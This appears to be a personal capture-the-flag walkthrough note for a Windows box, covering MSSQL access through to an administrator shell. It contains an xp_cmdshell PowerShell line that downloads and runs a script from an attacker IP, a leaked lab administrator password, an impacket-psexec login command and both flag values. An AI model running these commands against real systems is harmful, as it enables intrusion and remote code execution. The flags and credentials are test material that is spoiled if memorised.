public:: true
tags:: windows, mssql, psexec, history

- MSSQL Shell
	- ```powershell
	  xp_cmdshell powershell IEX(New-Object Net.webclient).downloadString(\"http://10.10.14.147:8000/rv.ps1\")
	  ```
- **User flag** at `C:\users\sql_svc\Desktop\user.txt`
	- 3e7b102e78218e935bf3f4951fec21a3
	  background-color:: green
- Administrator password found on shell history
	- `C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
		- #+BEGIN_CAUTION
		  /user:administrator MEGACORP_4dm1n!!
		  #+END_CAUTION
- ==privesc==: Get an administrative shell via psexec
	- ```bash
	  impacket-psexec 'administrator:MEGACORP_4dm1n!!@10.129.40.162'
	  ```
- **Root flag** at `C:\users\Administrator\Desktop\root.txt`
	- b91ccec3305e98240082d4474b848528
	  background-color:: green